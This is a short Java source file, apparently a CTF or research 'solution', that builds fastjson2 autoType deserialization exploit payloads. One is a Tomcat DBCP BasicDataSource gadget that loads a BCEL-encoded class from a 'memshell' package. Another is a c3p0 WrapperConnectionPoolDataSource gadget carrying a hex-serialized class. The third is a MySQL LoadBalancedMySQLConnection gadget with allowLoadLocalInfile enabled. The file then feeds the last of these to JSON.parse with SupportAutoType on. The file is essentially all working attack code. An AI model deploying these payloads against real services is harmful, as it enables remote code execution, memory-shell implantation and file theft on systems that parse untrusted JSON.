package xyz.eki.marshalexp.solution;

import com.alibaba.fastjson2.JSON;
import com.alibaba.fastjson2.JSONReader;
import xyz.eki.marshalexp.memshell.Evil;
import xyz.eki.marshalexp.utils.MiscUtils;
import org.apache.tomcat.dbcp.dbcp2.BasicDataSource;

public class Userconsole {
    public static void main(String[] args) throws Exception{
        String fmt = "{\"@type\":\"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\"driverClassLoader\": {\"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"}, \"driverClassName\": \"%s\"}";
        String exp = String.format(fmt, MiscUtils.dumpBCELClass(Evil.class));
        fmt = "{\"@type\":\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\",\"UserOverridesAsString\":\"HexAsciiSerializedMap:%s;\"}";
        exp = String.format(fmt,MiscUtils.bytes2HexString(MiscUtils.dumpClass(Evil.class)));
        exp = "{\"@type\": \"java.lang.AutoCloseable\",\"@type\": \"com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection\",\"proxy\":{\"connectionString\":{\"url\": \"jdbc:mysql://localhost:3306/foo?allowLoadLocalInfile=true\"}}}";
        System.out.println("Exp:"+exp);
        Object obj = JSON.parse(exp, new JSONReader.Feature[]{JSONReader.Feature.SupportAutoType});
        System.out.println(obj.getClass().getName());
    }
}
